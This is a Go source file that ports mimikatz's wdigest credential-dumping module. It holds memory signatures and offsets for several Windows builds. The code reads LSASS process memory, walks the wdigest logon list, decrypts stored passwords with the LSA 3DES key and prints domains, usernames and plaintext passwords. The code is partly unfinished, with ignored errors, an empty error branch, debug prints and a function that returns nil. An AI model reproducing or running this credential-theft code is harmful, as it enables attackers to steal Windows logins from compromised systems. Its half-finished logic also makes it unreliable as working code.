package kiwi

import (
	"bytes"
	"fmt"
	"reflect"
	"time"
	"unicode/utf16"
	"unsafe"

	"github.com/pkg/errors"
	"golang.org/x/sys/windows"

	"project/internal/logger"
	"project/internal/module/windows/api"
)

// reference:
// https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/sekurlsa/packages/kuhl_m_sekurlsa_wdigest.c

var (
	patternWin5xX64PasswordSet = []byte{0x48, 0x3B, 0xDA, 0x74}
	patternWin6xX64PasswordSet = []byte{0x48, 0x3B, 0xD9, 0x74}
	// key = build version
	wdigestReferencesX64 = map[uint32]*patchGeneric{
		buildWinXP: {
			search: &patchPattern{
				length: len(patternWin5xX64PasswordSet),
				data:   patternWin5xX64PasswordSet,
			},
			patch:   &patchPattern{length: 0, data: nil},
			offsets: &patchOffsets{off0: -4, off1: 36},
		},
		buildWin2003: {
			search: &patchPattern{
				length: len(patternWin5xX64PasswordSet),
				data:   patternWin5xX64PasswordSet,
			},
			patch:   &patchPattern{length: 0, data: nil},
			offsets: &patchOffsets{off0: -4, off1: 48},
		},
		buildWinVista: {
			search: &patchPattern{
				length: len(patternWin6xX64PasswordSet),
				data:   patternWin6xX64PasswordSet,
			},
			patch:   &patchPattern{length: 0, data: nil},
			offsets: &patchOffsets{off0: -4, off1: 48},
		},
	}
)

var (
	patternWin5xX86PasswordSet      = []byte{0x74, 0x18, 0x8B, 0x4D, 0x08, 0x8B, 0x11}
	patternWin60X86PasswordSet      = []byte{0x74, 0x11, 0x8B, 0x0B, 0x39, 0x4E, 0x10}
	patternWin63X86PasswordSet      = []byte{0x74, 0x15, 0x8B, 0x0A, 0x39, 0x4E, 0x10}
	patternWin64X86PasswordSet      = []byte{0x74, 0x15, 0x8B, 0x0F, 0x39, 0x4E, 0x10}
	patternWin10v1809X86PasswordSet = []byte{0x74, 0x15, 0x8b, 0x17, 0x39, 0x56, 0x10}
	// key = build version
	wdigestReferencesX86 = map[uint32]*patchGeneric{
		buildWinXP: {
			search: &patchPattern{
				length: len(patternWin5xX86PasswordSet),
				data:   patternWin5xX86PasswordSet,
			},
			patch:   &patchPattern{length: 0, data: nil},
			offsets: &patchOffsets{off0: -6, off1: 36},
		},
		buildWin2003: {
			search: &patchPattern{
				length: len(patternWin5xX86PasswordSet),
				data:   patternWin5xX86PasswordSet,
			},
			patch:   &patchPattern{length: 0, data: nil},
			offsets: &patchOffsets{off0: -6, off1: 28},
		},
		buildWinVista: {
			search: &patchPattern{
				length: len(patternWin60X86PasswordSet),
				data:   patternWin60X86PasswordSet,
			},
			patch:   &patchPattern{length: 0, data: nil},
			offsets: &patchOffsets{off0: -6, off1: 32},
		},
		buildMinWinBlue: {
			search: &patchPattern{
				length: len(patternWin63X86PasswordSet),
				data:   patternWin63X86PasswordSet,
			},
			patch:   &patchPattern{length: 0, data: nil},
			offsets: &patchOffsets{off0: -4, off1: 32},
		},
		buildMinWin10: {
			search: &patchPattern{
				length: len(patternWin64X86PasswordSet),
				data:   patternWin64X86PasswordSet,
			},
			patch:   &patchPattern{length: 0, data: nil},
			offsets: &patchOffsets{off0: -6, off1: 32},
		},
		buildWin10v1809: {
			search: &patchPattern{
				length: len(patternWin10v1809X86PasswordSet),
				data:   patternWin10v1809X86PasswordSet,
			},
			patch:   &patchPattern{length: 0, data: nil},
			offsets: &patchOffsets{off0: -6, off1: 32},
		},
	}
)

func (kiwi *Kiwi) searchWdigestCredentialAddress(pHandle windows.Handle) error {
	wdigest, err := kiwi.lsass.GetBasicModuleInfo(pHandle, "wdigest.DLL")
	if err != nil {
		return err
	}
	// read wdigest.dll memory
	memory := make([]byte, wdigest.size)
	_, err = api.ReadProcessMemory(pHandle, wdigest.address, &memory[0], uintptr(wdigest.size))
	if err != nil {
		return errors.WithMessage(err, "failed to read memory about wdigest.DLL")
	}
	// search logon session list pattern
	patch := wdigestReferencesX64[buildWinVista]

	index := bytes.Index(memory, patch.search.data)
	if index == -1 {
		return errors.WithMessage(err, "failed to search wdigest primary pattern")
	}
	address := wdigest.address + uintptr(index+patch.offsets.off0)
	var offset int32
	_, err = api.ReadProcessMemory(pHandle, address, (*byte)(unsafe.Pointer(&offset)), unsafe.Sizeof(offset))
	if err != nil {
		return errors.WithMessage(err, "failed to read offset about wdigest credential address")
	}
	wdigestCredAddr := address + unsafe.Sizeof(offset) + uintptr(offset)
	kiwi.logf(logger.Debug, "wdigest credential address is 0x%X", wdigestCredAddr)
	kiwi.wdigestPrimaryOffset = patch.offsets.off1
	kiwi.wdigestCredAddr = wdigestCredAddr
	return nil
}

// reference:
// https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/sekurlsa/packages/kuhl_m_sekurlsa_wdigest.h

type wdigestListEntry struct {
	fLink      uintptr
	bLink      uintptr
	usageCount uint32
	this       uintptr
	luid       windows.LUID
}

// Wdigest contains credential information.
type Wdigest struct {
	Domain   string
	Username string
	Password string
}

func (kiwi *Kiwi) getWdigestList(pHandle windows.Handle, logonID windows.LUID) ([]*Wdigest, error) {
	kiwi.mu.Lock()
	defer kiwi.mu.Unlock()
	if kiwi.wdigestCredAddr == 0 {
		err := kiwi.searchWdigestCredentialAddress(pHandle)
		if err != nil {
			return nil, errors.WithMessage(err, "failed to search wdigest credential address")
		}
	}
	address := kiwi.wdigestCredAddr
	// read wdigest credential data address
	var addr uintptr
	_, err := api.ReadProcessMemory(pHandle, address, (*byte)(unsafe.Pointer(&addr)), unsafe.Sizeof(addr))
	if err != nil {
		return nil, errors.WithMessage(err, "failed to read wdigest credential list address")
	}
	kiwi.logf(logger.Debug, "wdigest credential data address is 0x%X", addr)
	// read linked list address by LUID
	ticker := time.NewTicker(3 * time.Millisecond)
	defer ticker.Stop()
	var resultAddr uintptr // TODO for what?
	for {
		// prevent dead loop
		select {
		case <-ticker.C:
		case <-kiwi.context.Done():
			return nil, kiwi.context.Err()
		}

		if addr == address {
			break
		}
		size := unsafe.Offsetof(wdigestListEntry{}.luid) + unsafe.Sizeof(windows.LUID{})
		var entry wdigestListEntry
		_, err = api.ReadProcessMemory(pHandle, addr, (*byte)(unsafe.Pointer(&entry)), size)
		if err != nil {
			break
		}
		if logonID == entry.luid {
			resultAddr = addr
			break
		}
		addr = entry.fLink
	}
	fmt.Printf("0x%X\n", resultAddr)

	var cred genericPrimaryCredential
	credAddr := uintptr(int(addr) + kiwi.wdigestPrimaryOffset)
	size := uintptr(kiwi.wdigestPrimaryOffset + int(unsafe.Sizeof(cred)))
	_, err = api.ReadProcessMemory(pHandle, credAddr, (*byte)(unsafe.Pointer(&cred)), size)
	if err != nil {
		return nil, errors.WithMessage(err, "failed to read wdigest primary credential")
	}

	domain, err := api.ReadLSAUnicodeString(pHandle, &cred.Domain)

	username, err := api.ReadLSAUnicodeString(pHandle, &cred.Username)

	if username == "" {
		return nil, nil
	}

	// read encrypted password
	lus := cred.Password
	if lus.MaximumLength != 0 {
		data := make([]byte, int(lus.MaximumLength))
		_, err := api.ReadProcessMemory(pHandle, lus.Buffer, &data[0], uintptr(lus.MaximumLength))
		if err != nil {

		}
		fmt.Println(data)

		pwd := make([]byte, len(data))

		// iv will be changed, so we need copy
		// TODO call function
		iv := make([]byte, 8)
		copy(iv, kiwi.lsaNT6.iv[:8])

		api.BCryptDecrypt(kiwi.lsaNT6.key3DES, data, 0, iv, pwd)

		var utf16Str []uint16
		sh := (*reflect.SliceHeader)(unsafe.Pointer(&utf16Str))
		sh.Len = int(lus.Length / 2)
		sh.Cap = int(lus.Length / 2)
		sh.Data = uintptr(unsafe.Pointer(&pwd[0]))

		fmt.Println(pwd)
		fmt.Println(len(utf16.Decode(utf16Str)))

		fmt.Println("final password:", string(utf16.Decode(utf16Str)))
	}

	password, err := api.ReadLSAUnicodeString(pHandle, &cred.Password)

	// decrypt password

	fmt.Println("Domain:", domain)
	fmt.Println("Username:", username)
	fmt.Println("Password:", password)

	return nil, nil

}
